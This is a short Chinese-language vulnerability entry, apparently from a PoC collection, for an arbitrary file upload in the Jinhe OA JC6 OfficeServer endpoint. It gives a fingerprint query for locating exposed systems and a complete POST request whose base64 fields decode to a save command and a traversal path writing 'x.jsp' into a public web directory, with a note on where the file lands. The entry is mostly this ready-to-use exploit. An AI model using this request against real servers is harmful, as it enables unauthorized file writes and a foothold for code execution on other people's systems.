# 金和OAJC6OfficeServer任意文件上传漏洞

- **系统**：金和OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="JC6金和协同管理平台"`
- **请求**：`POST /jc6/OfficeServer HTTP/1.1`

**请求体 / payload**
```
请求出现如下页面表示可能存在漏洞
/jc6/OfficeServer

可修改`HTMLNAME`为上传文件位置base64编码
Host: xx.xx.xx.xx
Cookie: JSESSIONID=73295333CBCF07B98B3D91F0225C3EF6
Sec-Fetch-User: ?1
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
DBSTEP V3.0     0               14              0
DBSTEP=REJTVEVQ
OPTION=U0FWRUFTSFRNTA==
HTMLNAME=Li4vLi4vcHVibGljL2VkaXQveC5qc3A=
12321

上传文件位置
/public/edit/x.jsp
```

**其他**
- 金和OA JC6 OfficeServer 任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞简介
***
- 版本: * 金和OA